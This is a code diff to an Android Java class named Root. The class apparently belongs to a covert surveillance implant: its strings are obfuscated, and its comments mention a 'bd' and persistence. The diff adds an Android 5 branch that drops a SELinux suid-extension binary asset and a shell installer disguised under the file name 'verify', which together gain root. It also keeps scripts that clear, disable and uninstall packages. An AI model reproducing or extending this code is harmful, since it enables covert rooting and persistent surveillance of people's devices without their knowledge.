@@ -363,7 +363,13 @@ public class Root {
 			script += M.e("pm clear ") + packageName + "\n";
 			script += M.e("pm disable ") + packageName + "\n";
 			script += M.e("pm uninstall ") + packageName + "\n";
-			//script += M.e("pm enable ") + packageName + "\n";
+			if (android.os.Build.VERSION.SDK_INT > 20 && ( Status.isPersistent() || Status.persistencyReady()) ){
+				/* I got one case where bd was partially uninstalled on android5 and manually issued a pm enable to re install, just keep the code here as remainder
+				 * Note: tipical behaviour of disable app, is that when you try to install it again, its icon doesn't appear inside the app dock, and its' impossible
+				 * to start it
+				 */
+				//script += M.e("pm enable ") + packageName + "\n";
+			}
 				/* todo: do it manually? without pm intervention
 				 * 1) edit /data/system/packages.xml
 				 * 2) edit /data/system/packages.list
@@ -604,7 +610,11 @@ public class Root {
 		final AutoFile shellInstaller = new AutoFile(installPath, M.e("verify")); // shell_installer.sh
 
 		try {
-			Utils.dumpAsset(M.e("jb.data"), selinuxSuidext.getName());// selinux_suidext
+			if (android.os.Build.VERSION.SDK_INT > 20) {
+				Utils.dumpAsset(M.e("jbl.data"), selinuxSuidext.getName());// selinux_suidext Lollipop
+			}else {
+				Utils.dumpAsset(M.e("jb.data"), selinuxSuidext.getName());// selinux_suidext
+			}
 			Utils.dumpAsset(M.e("kb.data"), shellInstaller.getName());// shell_installer.sh
 
 			if (Cfg.DEBUG) {
@@ -655,7 +665,11 @@ public class Root {
 
 		try {
 			// selinux_suidext
-			Utils.dumpAsset(M.e("jb.data"), selinuxSuidext.getName());
+			if (android.os.Build.VERSION.SDK_INT > 20) {
+				Utils.dumpAsset(M.e("jbl.data"), selinuxSuidext.getName());// selinux_suidext Lollipop
+			}else {
+				Utils.dumpAsset(M.e("jb.data"), selinuxSuidext.getName());
+			}
 
 			if (Cfg.DEBUG) {
 				Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: " + selinuxSuidext);
